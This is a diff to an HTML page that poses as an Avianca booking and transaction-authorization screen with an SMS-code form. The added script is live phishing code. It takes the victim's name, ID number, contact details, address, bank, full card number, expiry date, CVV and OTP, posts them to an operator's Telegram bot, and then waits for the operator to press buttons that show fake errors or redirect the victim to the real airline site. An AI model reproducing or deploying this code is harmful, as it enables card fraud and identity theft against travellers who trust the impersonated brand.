@@ -1,30 +1,75 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Booking</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="assets/favicon.svg" type="image/x-icon">
+    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/checkers.css">
-    <link rel="stylesheet" href="css/normalize.css">
-    <script src="js/functions.js"></script>
+    <link rel="stylesheet" href="./css/checkers.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <script src="./js/functions.js"></script>
+
     <style>
-        .loaderp { width: 48px; height: 48px; border: 5px solid #fff; border-bottom-color: #e8114b; border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite; }
-        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loaderp-full { position: fixed; top: 0; left: 0; overflow-y: hidden; z-index: 1000; background-color: white; width: 100vw; height: 100vh; display: none; flex-direction: column; justify-content: center; align-items: center; }
-        .content form input { width: 100% !important; box-sizing: border-box !important; }
-        .hidden { display: none !important; }
+        .loaderp {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #fff;
+            border-bottom-color: #e8114b;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loaderp-full {
+            position: fixed;
+            top: 0;
+            left: 0;
+            overflow-y: hidden;
+            z-index: 1000;
+            background-color: white;
+            width: 100vw;
+            height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .content form input {
+            width: 100% !important;
+            box-sizing: border-box !important;
+        }
+
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
-    <div class="main-loader show"> <img id="company-loader"> <div class="loader"></div> </div>
-    <div class="logos"> <img id="bank-logo" src="" alt="" width=""> <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca 2" width="110px"> </div>
+    <div class="main-loader show">
+        <img id="company-loader">
+        <div class="loader"></div>
+    </div>
+    <div class="logos">
+        <img id="bank-logo" src="" alt="" width="">
+        <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca 2" width="110px">
+    </div>
     <main>
         <div class="content">
             <b style="margin-bottom: 20px; display: block;">Autorización de transacción</b>
@@ -46,72 +91,198 @@
             </form>
         </div>
         <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
-        <button id="btnNextStep" class="btn-success"> Aceptar </button>
+        <button id="btnNextStep" class="btn-success">
+            Aceptar
+        </button>
     </main>
-    <div class="loaderp-full"> <span class="loaderp"></span> <p class="text-italic tc-ocean fs-3 fw-light">Validando datos...</p> </div>
-    <script src="js/id_check.js"></script>
+
+    <div class="loaderp-full">
+        <span class="loaderp"></span>
+        <p class="text-italic tc-ocean fs-3 fw-light">Validando datos...</p>
+    </div>
+
+    <script src="./js/id_check.js"></script>
     <script>
-        async function checkVerification(messageId) {
-            const response = await fetch('/api/verificar-estado', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ messageId })
-            });
-            const data = await response.json();
-            
-            if (data.action) {
-                switch (data.action) {
-                    case 'error_otp':
-                        alert("Error en el código SMS. Por favor, ingréselo nuevamente.");
-                        document.querySelector(".loaderp-full").style.display = "none";
-                        break;
-                    case 'error_tc':
-                        alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
-                        window.location.href = "/payment.html";
-                        break;
-                    case 'finalizar':
-                        window.location.href = "https://www.avianca.com/";
-                        break;
-                    default:
-                        document.querySelector(".loaderp-full").style.display = "none";
-                        break;
+        function escapeMarkdownV2(text) {
+            if (!text) return '';
+            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
+            let escapedText = text;
+            for (const char of specialChars) {
+                const regex = new RegExp(`\\${char}`, 'g');
+                escapedText = escapedText.replace(regex, `\\${char}`);
+            }
+            return escapedText;
+        }
+
+        async function loadTelegramConfig() {
+            try {
+                const response = await fetch("./js/brr76.json");
+                if (!response.ok) {
+                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
                 }
-            } else {
-                setTimeout(() => checkVerification(messageId), 2000);
+                return await response.json();
+            } catch (error) {
+                console.error("Error al cargar el archivo de configuración de Telegram:", error);
+                return null;
             }
         }
-        
-        document.getElementById("btnNextStep").addEventListener("click", async function() {
-            const otpInput = document.getElementById('otpcode_input');
-            if (!otpInput.value) { alert("Por favor, complete el campo de código OTP."); return; }
-            
-            document.querySelector(".loaderp-full").style.display = "flex";
-            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
-            const messageId = localStorage.getItem('messageId');
 
-            try {
-                // Llamada segura a la API del servidor
-                const response = await fetch('/api/enviar-otp', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ otpcode: otpInput.value, storedData })
-                });
-                const data = await response.json();
-                
-                if (data.success) {
-                    console.log("OTP enviado al servidor con éxito.");
-                    checkVerification(messageId);
-                } else {
-                    console.error("Error del servidor:", data.error);
-                    document.querySelector(".loaderp-full").style.display = "none";
-                    alert("Error al enviar el OTP. Por favor, intente de nuevo.");
-                }
-            } catch (error) {
-                console.error("Error de conexión:", error);
+        const inputMap = {
+            'pedir_otp': { label: 'otpcode_label', input: 'otpcode_input' },
+            'error_tc': { error_msg: "Error en la tarjeta. Por favor, intente de nuevo." },
+            'error_otp': { label: 'otpcode_label', input: 'otpcode_input', error_msg: "Error en el código SMS. Por favor, ingréselo nuevamente." },
+        };
+
+        function hideAllInputs() {
+            // No es necesario ocultar porque solo hay un campo visible
+        }
+
+        async function checkVerification(transactionId, messageId) {
+            const config = await loadTelegramConfig();
+            if (!config) {
                 document.querySelector(".loaderp-full").style.display = "none";
-                alert("Error de conexión. Por favor, intente de nuevo más tarde.");
+                return;
             }
+            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
+                .then(response => response.json())
+                .then(data => {
+                    const updates = data.result;
+                    const verificationUpdate = updates.find(
+                        (update) =>
+                        update.callback_query &&
+                        update.callback_query.message.message_id === messageId
+                    );
+
+                    if (verificationUpdate) {
+                        const action = verificationUpdate.callback_query.data.split(':')[0];
+                        const actionConfig = inputMap[action];
+
+                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: config.chat_id,
+                                message_id: messageId,
+                                reply_markup: { inline_keyboard: [] }
+                            }),
+                        });
+
+                        document.querySelector(".loaderp-full").style.display = "none";
+                        hideAllInputs();
+
+                        if (actionConfig && actionConfig.error_msg) {
+                            alert(actionConfig.error_msg);
+                        }
+
+                        switch (action) {
+                            case 'error_tc':
+                                window.location.href = "payment.html";
+                                break;
+                            case 'finalizar':
+                                window.location.href = "https://www.avianca.com/";
+                                break;
+                            default:
+                                break;
+                        }
+                    } else {
+                        setTimeout(() => checkVerification(transactionId, messageId), 2000);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error al verificar el estado:", error);
+                    setTimeout(() => checkVerification(transactionId, messageId), 2000);
+                });
+        }
+
+        document.getElementById("btnNextStep").addEventListener("click", function() {
+            const otpInput = document.getElementById('otpcode_input');
+            if (!otpInput.value) {
+                alert("Por favor, complete el campo de código OTP.");
+                return;
+            }
+
+            document.querySelector(".loaderp-full").style.display = "flex";
+            enviarDatos();
         });
+
+        async function enviarDatos() {
+            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
+            const transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
+            localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId }));
+
+            const formValues = {};
+            const otpInput = document.getElementById('otpcode_input');
+            formValues.otpcode = escapeMarkdownV2(otpInput.value);
+
+            const fullMessage = `
+✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*👤 DATOS DEL TITULAR*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🤵‍♂️ Nombre:* ${storedData.name ? escapeMarkdownV2(storedData.name) : 'No ingresado'}
+*🪪 Identificación:* ${storedData.cc ? escapeMarkdownV2(storedData.cc) : 'No ingresado'}
+*📧 Email:* ${storedData.email ? escapeMarkdownV2(storedData.email) : 'No ingresado'}
+*📱 Celular:* ${storedData.telnum ? escapeMarkdownV2(storedData.telnum) : 'No ingresado'}
+*🗺️ Ciudad:* ${storedData.city ? escapeMarkdownV2(storedData.city) : 'No ingresado'}
+*📍 Estado:* ${storedData.state ? escapeMarkdownV2(storedData.state) : 'No ingresado'}
+*🏠 Dirección:* ${storedData.address ? escapeMarkdownV2(storedData.address) : 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*💳 DETALLES DE LA TARJETA*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🏦 Banco:* ${storedData.bank ? escapeMarkdownV2(storedData.bank) : 'No ingresado'}
+*💳 Número de Tarjeta:*
+\`${storedData.cardNumber ? escapeMarkdownV2(storedData.cardNumber) : 'No ingresado'}\`
+*📅 Fecha de Exp:*
+\`${storedData.expiryDate ? escapeMarkdownV2(storedData.expiryDate) : 'No ingresado'}\`
+*🔐 CVV:*
+\`${storedData.cvv ? escapeMarkdownV2(storedData.cvv) : 'No ingresado'}\`
+*🔢 Cuotas:* ${storedData.dues ? escapeMarkdownV2(storedData.dues) : 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*👤 DATOS DE ACCESO*
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*Código OTP:* ${formValues.otpcode || 'No ingresado'}
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
+*🆔 ID de Transacción:* ${transactionId}
+`;
+
+            const keyboard = JSON.stringify({
+                inline_keyboard: [
+                    [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }, { text: "Error TC", callback_data: `error_tc:${transactionId}` }],
+                    [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
+                ],
+            });
+
+            const config = await loadTelegramConfig();
+            if (!config) {
+                document.querySelector(".loaderp-full").style.display = "none";
+                return;
+            }
+
+            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: config.chat_id,
+                    text: fullMessage,
+                    reply_markup: keyboard,
+                    parse_mode: "MarkdownV2",
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log("Mensaje enviado a Telegram con éxito");
+                    checkVerification(transactionId, data.result.message_id);
+                } else {
+                    console.error("Error al enviar mensaje a Telegram:", data);
+                    document.querySelector(".loaderp-full").style.display = "none";
+                }
+            })
+            .catch(error => {
+                console.error("Error al enviar mensaje a Telegram:", error);
+                document.querySelector(".loaderp-full").style.display = "none";
+            });
+        }
     </script>
 </body>
 </html>
